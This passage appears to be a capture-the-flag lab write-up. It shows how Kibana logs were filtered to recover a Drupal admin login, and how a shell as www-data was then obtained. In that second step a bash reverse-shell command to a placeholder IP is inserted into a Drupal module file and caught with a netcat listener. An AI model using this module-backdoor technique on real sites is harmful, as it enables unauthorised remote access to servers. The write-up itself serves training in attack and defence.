Now, we had access to the correct Drupal consol, but not the correct credentials to enter the admin console. We were given the forenesics evidence from Kibana, of over 87,000 hits, so some filtering needed to be done before finding what we were looking for. 

First, we thought that a great place to start looking for credentials was at the `http POST request` messages. When a user logs in, or tries to log in, a http POST request is sent, and a successfull or unsuccessful response is received in return. Then, after adding the filter `http.request.method: POST` we were left with 19 hits. 

When starting looking through some of them, we noticed that several of them tried to access the `user/login` page, and thought that this filter might give us an ever more narrow search. As seen bellow, adding the filer `http.request.headers.referer: http://10.13.37.4/user/login` left us with just 3 hits.

Three different passwords are tried by the attacker, and most likely his last attempt was the successful one. By checking the `http.response` message in this record, we could inndeed see that the user was redirected to `http://10.13.374/user/1?check_logged_in=1`, indicating that the attempt was successful.

Our thought got confirmed when entering the username *god* and the password *password1* and got successfully logged in.

Navigating to the users profile information, we located the flag.

## Task 3 - www-data

We already knew that we had to use the technique of reverse shell to get interactive access to www-data, which also could be seen in the logs from Kibana. By investigating the hits from the previous task, we also saw that the Drupal version running at this site was Drupal 9. 

With a quick Google search at "drupal 9 reverse shell" we found several websites explaining the way forward for carrying out this attack. Apparently, several Drupal versions are vulnerable to remote code execution due to an insecure use of `unserialize()` [(source)](https://vk9-sec.com/drupal-7-x-module-services-remote-code-execution/). One of the sites we found [(link)](https://www.sevenlayers.com/index.php/257-drupal-8-to-reverse-shell) provided us with a well-explained step-by-step guide which we benefitted from. 

The guide describes how one can exploit the use of modules in Drupal by inserting code into a `.module` file. At Drupal's own website we downloaded a random module compatible with Drupal 9, in this case called *codefiler*.

After unzipping the module, we added the following code line, with our designated IP address and the desired port number, to the file called `codefilter.module` : 

    exec("/bin/bash -c 'bash -i >& /dev/tcp/ip_address/portnumber 0>&1'");

 At the same time, a port listener was started in a terminal window by executing the command `nc -nvlp portnumber`. 


After uploadning the module, enabling it and installing it for use, we got a shell to www-data.

The flag was located in `www-data.txt`.
